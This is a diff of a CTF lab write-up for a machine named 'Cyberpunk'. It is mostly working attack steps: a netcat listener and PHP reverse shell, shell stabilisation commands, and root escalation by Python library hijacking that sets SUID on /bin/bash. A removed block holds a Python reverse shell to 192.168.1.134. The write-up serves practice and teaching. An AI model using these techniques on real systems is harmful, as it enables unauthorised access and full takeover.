@@ -232,8 +232,6 @@ Content inside of secret.txt:
 ❯ cat secret.txt
 ```
 
-
-
 ```bash
 *********************************************
 *                                           *
@@ -279,14 +277,65 @@ Accssing the HTTP port to execute the 'php-reverse-shell.php' file. Connected to
 ❯ nc -lnvp 443
 ```
 
+Activate the shell by loading the website.
+
+## Gained Access
+
 Ran the whoami command:
 
 ```bash
 # whoami
 www-data
 ```
+I'll save this session.
+
+```bash
+script /dev/null -c bash
+```
+Now I have a prompt.
+
+```bash
+www-data
+$ script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@Cyberpunk:/$ 
+```
+
+I am going to cancel this session and reopen it with a workable prompt.
+
+```bash
+ctrl+z
+```
+```bash
+stty raw -echo; fg
+```
+```bash
+reset xterm
+```
+```bash
+export SHELL=bash
+```
+```bash
+export TERM=xterm
+```
+
+The session is saved and noe CTRL+C will not cancel our session.
+
+Lastly, resize:
+
+```bash
+stty size rows 26 colums 124
+```
+
 
 ## Privilege Escalation
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+No binary with S.
+
+Additionally, 'sudo -l' can also be tested.
 
 Exploring the system I found an interesting file in /opt/arasaka.txt, which contains a Brainfuck encoded string.
 
@@ -295,31 +344,49 @@ Exploring the system I found an interesting file in /opt/arasaka.txt, which cont
 ```
 Decrypted the string and found useful information. We authenticated as the arasaka user and discovered we could execute a Python script with root privileges.
 
+Login in as arasaka:
+
 ```bash
-sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
+su arasaka
+```
+
+```bash
+rasaka@Cyberpunk:~$ ls
+randombase64.py  user.txt
+```
+```bash
+arasaka@Cyberpunk:~$ sudo -l
+[sudo] contraseña para arasaka: 
+Matching Defaults entries for arasaka on Cyberpunk:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User arasaka may run the following commands on Cyberpunk:
+    (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
 ```
 
 ## Exploiting the Vulnerability
 
 Using Python Library Hijacking to gain root access by modifying the script.
 
+Since we have write permissions I will create a script name 'base64.py' which is going to be imported when it gets called by randombase64.py
+
+
 ```python
-import socket
-import subprocess
 import os
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.1.134", 4443))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])
+os.system("chmod u+s /bin/bash")
 ```
+Run the command that arasaka can run as root.
 
-Connecting again through Netcat, this time as root.
+Enter any random string. It will give ou an error. 
+
+Now, this change our permission and gave us root access.
 
 ```bash
-# whoami
+bash -p
+```
+```bash
+bash-5.2# whoami
 root
 ```
 
